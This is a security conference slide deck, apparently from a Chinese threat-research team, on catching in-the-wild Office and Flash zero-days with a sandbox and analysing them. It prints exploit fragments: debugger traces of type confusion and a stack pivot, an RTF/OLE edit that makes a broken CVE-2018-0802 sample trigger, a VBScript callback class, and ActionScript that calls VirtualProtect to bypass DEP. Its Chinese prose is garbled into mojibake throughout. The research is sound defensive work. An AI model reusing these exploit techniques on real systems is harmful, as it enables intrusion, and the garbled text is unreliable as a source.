CVE-2017-8759
CVE-2018-8174
CVE-2018-8373
CVE-2014-4114
CVE-2014-6352
CVE-2015-0097
ä¸æ–­åæ€
èµ°è¿‡çš„å¼¯è·¯ï¼š4ä¸ª 0day + 1ä¸ª 1day
2017å¹´4æœˆ
â€¢ CVE-2017-0261 (0day)
â€¢ CVE-2017-0262 (0day) + CVE-2017-0263 (0day)
â€¢ åæ€
â€¢ æ²™ç®±æ£€æµ‹å¼•æ“æœ‰ç¼ºé™· â˜¹
â€¢ CVE-2017-0261 æ ·æœ¬æ— æ³•åœ¨ Office 2010 è§¦å‘ â˜¹
â€¢ CVE-2017-0262 æ ·æœ¬æ— æ³•åœ¨ Office 2007 è§¦å‘ â˜¹
â€¢ å½“ç”¨æˆ·æ€å¼•æ“é‡è§å†…æ ¸ 0day â˜¹
2017å¹´8æœˆ
â€¢ CVE-2017-8759 (0day)
â€¢ åæ€
â€¢ æ²™ç®±è·‘å‡ºäº†æ ·æœ¬ï¼Œä½†æœªèƒ½åŠæ—¶é€šçŸ¥åˆ†æäººå‘˜ â˜¹
2017å¹´10æœˆ
â€¢ CVE-2017-11292 (1day) 
â€¢ åæ€
â€¢ å¯¹ DealersChoice æ¡†æ¶ç¼ºä¹äº†è§£ â˜¹
â€¢ è‹¥ç›®æ ‡ä¸ºä½ç‰ˆæœ¬ Flashï¼Œä¸‹å‘ CVE-2015-7645 â˜¹
â€¢ è‹¥ç›®æ ‡ä¸ºé«˜ç‰ˆæœ¬ Flashï¼Œä¸‹å‘ CVE-2017-11292 ğŸ˜€
ç ”ç©¶æ”»å‡»æ¡†æ¶
â€¢ DealersChoice
â€¢ ç”± @Unit42_Intel å‘½å
â€¢ è¢« APT28 ä½¿ç”¨
â€¢ æŒç»­æ”¹è¿›ä»¥å°½å¯èƒ½åœ°èº²é¿æ£€æµ‹
â€¢ åˆå§‹æ‰‹æ³•
â€¢ æ£€æŸ¥å½“å‰ Flash ç‰ˆæœ¬
â€¢ åœ°ç†ä½ç½®åˆ¤æ–­
â€¢ å­˜æ´»æ—¶é—´çŸ­
â€¢ æ–°æ‰‹æ³•
â€¢ åæ²™ç®±ï¼šéœ€è¦æ¨¡æ‹Ÿæ–‡æ¡£ä¸‹æ»‘
â€¢ æ”¹å†™å¼€æºä»£ç ï¼ŒåŠ å…¥æ¶æ„åŠŸèƒ½ï¼Œèº²é¿é™æ€æ£€æµ‹
æŒç»­åˆ›æ–°
â€¢ æ²™ç®±æ£€æµ‹å¼•æ“ç¼ºé™· â˜¹
â€¢ å¼€å‘ä¸‹ä¸€ä»£æ²™ç®±æ£€æµ‹å¼•æ“ ğŸ˜€
â€¢ ç¯å¢ƒé€‰æ‹©ä¸æ­£ç¡® â˜¹
â€¢ åˆ¶ä½œå¤šç§ç¯å¢ƒ ğŸ˜€
â€¢ åˆ¶å®šè§¦å‘ç‡é«˜çš„æŠ•é€’ç­–ç•¥ ğŸ˜€
â€¢ ä¸èƒ½åŠæ—¶é€šçŸ¥åˆ†æäººå‘˜ â˜¹
â€¢ æ„å»ºå®æ—¶æ¨é€ç³»ç»Ÿ ğŸ˜€
â€¢ å¯¹æ”»å‡»æ¡†æ¶ä¸å¤Ÿç†Ÿæ‚‰ â˜¹
â€¢ ç ”ç©¶ DealersChoice æ¡†æ¶ ğŸ˜€
â€¢ å¼ºåŒ– Flash é’ˆå¯¹æ€§æ£€æµ‹ ğŸ˜€
ä»0åˆ°1
CVE-2017-11826
ä»0åˆ°1
â€¢ 2017å¹´9æœˆ27æ—¥
ä»0åˆ°1
â€¢ ç¬¬ä¸€æ¬¡æœ‰ä¸­å›½å‚å•†æŠ“åˆ° Office åœ¨é‡ 0day
CVE-2017-11826
â€¢ OLEObject & Font å¯¹è±¡ç±»å‹æ··æ·† + ActiveX æ§ä»¶å †å–·å°„
; Office 2007 ä¸‹æ­£å¸¸æ‰§è¡Œæ—¶
; mov
eax, [eax+44h]
0:000> dc 38450f4 l4c/4
038450f4
0000ffff 0000ffff 00000004 00000004
................
03845104
00000001 00000000 00000000 00000000
................
03845114
00000000 ffffffff ffffffff 00000000
................
03845124
00000000 ffffffff 00000000 00000000
................
03845134
00000000 01d9ffa0 67a02e58
........X..g
; mov
eax, [eax+44h]
0:000> dc 01d9ffa0 l4c/4
01d9ffa0
00000001 00000001 01f47928 00000009
........(y......
01d9ffb0
00000000 00000000 00000000 00000000
................
01d9ffc0
00000000 000004b0 00000000 00000000
................
01d9ffd0
0005003c 00000000 00000000 00000000
 dd 01f7e0a0 l1
01f7e0a0
65d9420c
; call
dword ptr [ecx+4]
0:000> dds 65d9420c l2
65d9420c
65b527ad mso!Ordinal1072+0x2dd
65d94210
658bbe71 mso!Ordinal836+0xaf
// AddRef
; Office 2007 ä¸‹è§¦å‘æ¼æ´æ—¶
; mov
eax, [eax+44h]
0:000> dc 5998140 l4c/4
05998140
000001de 000000dd 00000015 00000010
................
05998150
00000000 00000000 00000000 00000000
................
05998160
00000000 ffffffff ffffffff 00000000
................
05998170
00000000 ffffffff 00000000 00000000
................
05998180
00000000 04131700 67110a89
...........g
; mov
eax, [eax+44h]
0:000> dc 04131700 l4c/4
04131700
0000045f 00000000 00000000 00000000
_...............
04131710
00000000 00000000 00000000 00000000
................
04131720
00000000 00000000 0069004c 0063006e
........L.i.n.c.
04131730
00720065 00680043 00720061 00680043
e.r.C.h.a.r.C.h.
04131740
00720061 088888ec 006f0066
a.r.....f.o.
; mov
ecx, [eax]
0:000> dd 088888ec l1
088888ec
088883ec
; call
dword ptr [ecx+4]
0:000> dds 088883ec l2
088883ec
72980e2b MSVBVM60!IID_IVbaHost+0x127eb
088883f0
72980e2b MSVBVM60!IID_IVbaHost+0x127eb // Stack Pivot
ä»1åˆ°N
CVE-2018-0802
CVE-2018-8174
CVE-2018-5002
CVE-2018-15982
CVE-2018-0802
â€¢ å…¬å¼ç¼–è¾‘å™¨ç»„ä»¶æ ˆæº¢å‡º
â€¢ 2017å¹´12æœˆ14æ—¥
â€¢ åŒæ—¶å†…åµŒä¸¤ä¸ªæ¼æ´
â€¢ CVE-2017-11882 
â€¢ CVE-2018-0802
â€¢ å¯ä»¥æ­£å¸¸è§¦å‘å’ŒæˆåŠŸåˆ©ç”¨ ğŸ˜€
â€¢ 2017å¹´12æœˆ19æ—¥
â€¢ åªå†…åµŒä¸€ä¸ªæ¼æ´
â€¢ CVE-2018-0802
â€¢ æ— æ³•æ­£å¸¸è§¦å‘ â˜¹
â€¢ é‡æ–°æ„é€  OLE åå¯ä»¥æˆåŠŸåˆ©ç”¨ ğŸ˜€
CVE-2018-0802
â€¢ ä¸¤ä¸ªæ ·æœ¬éƒ½æŠ¥å‘Šç»™äº†å¾®è½¯
â€¢ 2018å¹´1æœˆ10æ—¥ï¼Œå¾®è½¯å¯¹æˆ‘ä»¬è¿›è¡Œäº†è‡´è°¢
CVE-2018-0802
â€¢ 2017å¹´12æœˆ19æ—¥çš„æ ·æœ¬
â€¢ MD5: 299D0C5F43E59FC9415D70816AEE56C6
â€¢ å†…åµŒ 0day ğŸ˜€
â€¢ RTF æ··æ·† ğŸ˜€
â€¢ OLE æ•°æ®æ„é€ é”™è¯¯ â˜¹
é”™è¯¯çš„å…¬å¼æµï¼š
DirEntry SID=4: 
'\xe7\x90\x80\xe6\xa4\x80\xe7\x98\x80\xe6\x94\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe2\
x80\x80\xc8\x80\xef\xbc\x80\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xef\xbf\xbf\xc3\xbf\x00'
- type: 0
- sect: 0
- SID left: 0, right: 0, child: 0
- size: 0 (sizeLow=0, sizeHigh=0) # logged by olefile.py
æ­£å¸¸å…¬å¼æµï¼š
DirEntry SID=4: 'Equation Native'
- type: 2
- sect: 4
- SID left: 4294967295, right: 4294967295, child: 4294967295
- size: 197 (sizeLow=197, sizeHigh=0) # logged by olefile.py
CVE-2018-0802
â€¢ å“ªé‡Œé”™äº†ï¼Ÿ
â€¢ æå–è§£æ··æ·†åçš„ OLE å¯¹è±¡
0:010> bp ole32!OleConvertOLESTREAMToIStorage
0:010> g
Breakpoint 0 hit
eax=000004e0 ebx=059bc3c0 ecx=00008000 edx=00000000 esi=02d80960 edi=001dade8
eip=75c528fa esp=001dab2c ebp=001dadb0 iopl=0         nv up ei pl nz na pe nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200206
ole32!OleConvertOLESTREAMToIStorage:
75c528fa 8bff            mov     edi,edi
0:000> .writemem C:\de-obfuscated_ole.bin poi(poi(poi(esp + 0x04) + 0x08)) Lpoi(poi(esp + 0x04) + 0x0C)
Writing dc5 bytes..
0:000> db poi(poi(poi(esp + 0x04) + 0x08))
04946510  01 05 00 00 02 00 00 00-0b 00 00 00 45 71 75 61  ............Equa
04946520  74 69 6f 6e 2e 33 00 00-00 00 00 00 00 00 00 00  tion.3..........
04946530  0e 00 00 d0 cf 11 e0 a1-b1 1a e1 00 00 00 00 00  ................
04946540  00 00 00 00 00 00 00 00-00 00 00 3e 00 03 00 fe
...........>....
04946550  ff 09 00 06 00 00 00 00-00 00 00 00 00 00 00 01  ................
04946560  00 00 00 01 00 00 00 00-00 00 00 00 10 00 00 02  ................
04946570  00 00 00 01 00 00 00 fe-ff ff ff 00 00 00 00 00  ................
04946580  00 00 00 ff ff ff ff ff-ff ff ff ff ff ff ff ff
................
CVE-2018-0802
â€¢ å“ªé‡Œé”™äº†ï¼Ÿ
â€¢ MiniFat Sector é”™ä½ 0x15 å­—èŠ‚
CVE-2018-0802
â€¢ å¦‚ä½•â€œä¿®å¤â€ï¼Ÿ
â€¢ å¯¹åŸå§‹ RTF æ–‡æ¡£ç¨ä½œä¿®æ”¹ ğŸ˜€
{\object\objemb\objupdate{\*\objclass Equation.3}\objw380\objh260{\*\objdata 01050000{{\object}}
02000000
0b000000
4571756174696f6e2e3300
00000000
00000000
000e0000 ; Data Size
d0cf11e0a1b11ae1000000000000000000000000000000003e000300feff090006000000000000
...
000000000000000000000000000000000000000000feffffff02000000 ; åœ¨ MiniFat Sector å‰é¢å¡«å…… 42 ä¸ª 0
...
{\oldff}0a00ffffffff0100000000001c000000fb021000070000000000bc02000000000102022253797374656d000048008a0100000a0006000
0004800{\ole}8a01ffffffff7cef1800040000002d01010004000000f00100000300000000000000000000000000000000000000000000000000
0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000 ; è¡¥è¶³é•¿åº¦
ä»¥æ»¡è¶³ Data Size
...
0105000000000000 ; è¡¥å…… Presentation æ•°æ®
CVE-2018-0802
â€¢ 2018å¹´å…ƒæ—¦åï¼Œæ›´å¤š CVE-2018-0802 æ ·æœ¬å‡ºç°
â€¢ å…¶ä»–ç ”ç©¶å‘˜æ³¨æ„åˆ°äº†è¿™äº›æ ·æœ¬ï¼Œä½†ä¸çŸ¥é“å®ƒä»¬åˆ©ç”¨äº† 0day â˜¹
å¦‚ä½•åŒºåˆ†ä¸¤ä¸ªæ¼æ´
IPersistStorage::Load(406881)
offset:406a93     call ReadMTEFData(42f8ff)
offset:42f921     call 43755c
offset:4375d5    call 43a720
offset:43a72a    call 43a87a
offset:43a89b    call 43b418
; Font tag parse Logic
offset:43b44b    call ReadFontName(4164fa)
offset:43b461    call 4214c6
offset:4214dd    call LogfontStruct_Overflow(421774)
offset:4217c3    call 421e39 
offset:421e5e    rep movsd  è¶…é•¿æ•°ç»„ -> ä»»æ„åœ°å€è¯»å†™
// before mem = Value
0:005> dd 022cb91c l4
022cb91c  00000008 00000000 04730834 00000000
0:005> dd 04730834 l6
04730834  08800001 00000001 00000000 00000000
04730844  7fffffff 00000000
// after mem = Value
0:007> dd 022cb91c l4
022cb91c  0000200c 00000000 04730834 00000000
0:007> dd 04730834 l6
04730834  08800001 00000001 00000000 00000000
04730844  7fffffff 00000000
Class class_setprop_a
Dim mem
Function P
End Function
Function SetProp(Value)
mem = Value 'callback
SetProp = 0
End Function
End Class
CVE-2018-5002
â€¢ 2018å¹´6æœˆ1æ—¥
â€¢ ä¸€å¥—å¤æ‚çš„ Flash æ§åˆ¶æ¡†æ¶
â€¢ AVM2 è§£é‡Šå™¨æ¼æ´
CVE-2018-5002
â€¢ 2018å¹´6æœˆ7æ—¥ï¼ŒAdobe å¯¹æˆ‘ä»¬è¿›è¡Œäº†è‡´è°¢
CVE-2018-5002
â€¢ ç»•è¿‡ ROP æ£€æµ‹ ğŸ˜€
â€¢ è¦†ç›–è¿”å›åœ°å€ç»•è¿‡ CFG ğŸ˜€
â€¢ æ— æ³•ç»•è¿‡ EAF æ£€æµ‹ â˜¹
var cls25:class_25 = new class_25(cls8, RtlUnwind_Addr);
var NtProtectVirtualMemory_Addr:uint = cls25.GetFuncAddrByEAT("NtProtectVirtualMemory");
if(0 == NtProtectVirtualMemory_Addr)
{
return new Array();
}
var NtPrivilegedServiceAuditAlarm_Addr:uint = cls25.GetFuncAddrByEAT("NtPrivilegedServiceAuditAlarm");
if(0 == NtPrivilegedServiceAuditAlarm_Addr)
{
return new Array();
}
å¦‚ä½•è°ƒè¯• CVE-2018-5002
â€¢ é€†å‘ -> ASC2.0 ç¼–è¯‘ -> å€ŸåŠ© FFDEC ä¿®æ”¹å­—èŠ‚ç  -> è·å¾—å¯è°ƒè¯•çš„ swf æ–‡ä»¶
â€¢ å¼€æºçš„ WinDBG æ’ä»¶
â€¢ https://github.com/michaelpdu/flashext_pykd
â€¢ æ·»åŠ 3è¡Œä»£ç ï¼Œè®©æ’ä»¶å˜å¾—æ›´å®Œç¾ ğŸ˜€
def callback_after_call_getmethodname(self):
# dprintln("Enter into callback_after_call_getmethodname")
reg_eax = reg("eax")
# dprintln("EAX = " + hex(reg_eax))
addr_name = ptrPtr(reg_eax + 0x08)
len_name = ptrPtr(reg_eax + 0x10)
if 0 == addr_name and 0 != len_name:
if ptrPtr(reg_eax + 0x0C) != 0:
addr_name = ptrPtr(ptrPtr(reg_eax + 0x0C) + 0x08)
è°ƒè¯•å™¨ä¸­çš„ CVE-2018-5002
// è§¦å‘æ¼æ´å‰
0:007> dd 02c0ab24-10
02c0ab14  093101f0 093101a0 093101f0 093101a0
02c0ab24  093101f0 093101a0 093101f0 093101a0
02c0ab34  093101f0 093101a0 093101f0 093101a0
02c0ab44  093101f0 093101a0 093101f0 093101a0
02c0ab54  093101f0 093101a0 093101f0 093101a0
02c0ab64  093101f0 093101a0 093101f0 093101a0
02c0ab74  093101f0 093101a0 093101f0 093101a0
02c0ab84  093101f0 093101a0 093101f0 093101a0
// è§¦å‘æ¼æ´å
0:007> dd 02c0ab24-10
02c0ab14  093101f0 093101a0 093101f0 093101f0
02c0ab24  093101a0 093101a0 093101f0 093101a0
02c0ab34  093101f0 093101a0 093101f0 093101a0
02c0ab44  093101f0 093101a0 093101f0 093101a0
02c0ab54  093101f0 093101a0 093101f0 093101a0
02c0ab64  093101f0 093101a0 093101f0 093101a0
02c0ab74  093101f0 093101a0 093101f0 093101a0
02c0ab84  093101f0 093101a0 093101f0 093101a0
â€¢ è§¦å‘æ¼æ´ -> äº¤æ¢æŒ‡é’ˆ -> ç±»å‹æ··æ·†
CVE-2018-15982
â€¢ 2018å¹´11æœˆ29æ—¥
â€¢ 2ä¸ªå°æ—¶ï¼Œ2ä¸ªæ ·æœ¬
â€¢ TVSDK ä¸­çš„ UAF æ¼æ´
CVE-2018-15982
â€¢ 2018å¹´12æœˆ5æ—¥ï¼ŒAdobe å†æ¬¡å¯¹æˆ‘ä»¬è¿›è¡Œäº†è‡´è°¢
CVE-2018-15982
â€¢ ç”¨ HackingTeam çš„æŠ€å·§ç»•è¿‡äº† ROP æ£€æµ‹ ğŸ˜€
â€¢ æ— æ³•èº²é¿ EAF æ£€æµ‹ â˜¹
// Virt(ualPro)tect = 74726956 74636574
var vp_addr:uint = this.getFuncAddrByEAT32(0x74726956, 0x74636574, 10, kernel32_addr);
...
this.writeDWORD32(sc_addr + 8 + 0x80 + 0x1c, vp_addr);
this.writeDWORD32(ptbl, sc_addr + 8 + 0x80);
this.writeDWORD32(p + 0x1c, sc_addr);
this.writeDWORD32(p + 0x20, vec_uint.length * 4);
var args:Array = new Array(0x41);
Payload.call.apply(null, args); // Call VirtualProtect to bypass DEP
å…¶ä»–æ”¶è·
â€¢ 1 Word CVE ğŸ˜€
â€¢ 1 PowerPoint CVE ğŸ˜€
â€¢ 4 Excel CVE ğŸ˜€
â€¢ 1 Win32k CVE ğŸ˜€
æ€»ç»“
â€¢ ä»ï¼‘åˆ°ï¼®æ˜“ï¼Œä»ï¼åˆ°ï¼‘éš¾
â€¢ äº†è§£å¯¹æ‰‹ï¼Œåæ€è‡ªå·±ï¼Œæˆ˜èƒœå¯¹æ‰‹
â€¢ æ°¸è¿œåœ¨è·¯ä¸Š
è‡´è°¢
â€¢ æ„Ÿè°¢ 360 é«˜çº§å¨èƒå›¢é˜Ÿçš„æ‰€æœ‰å°ä¼™ä¼´
â€¢ æ„Ÿè°¢ @programmeboy, @guhe120, @binjo, @Unit42_Intel
â€¢ ç‰¹åˆ«æ„Ÿè°¢ @HaifeiLi å’Œä»–å…³äº Office å®‰å…¨çš„åˆ†äº«
å¤§æµ·æé’ˆï¼šä½¿ç”¨æ²™ç®±æ•è·å¤šä¸ªé›¶æ—¥æ¼æ´
æç¦
PI:EMAIL
@leeqwind
é‡‘æƒ
PI:EMAIL
@jq0904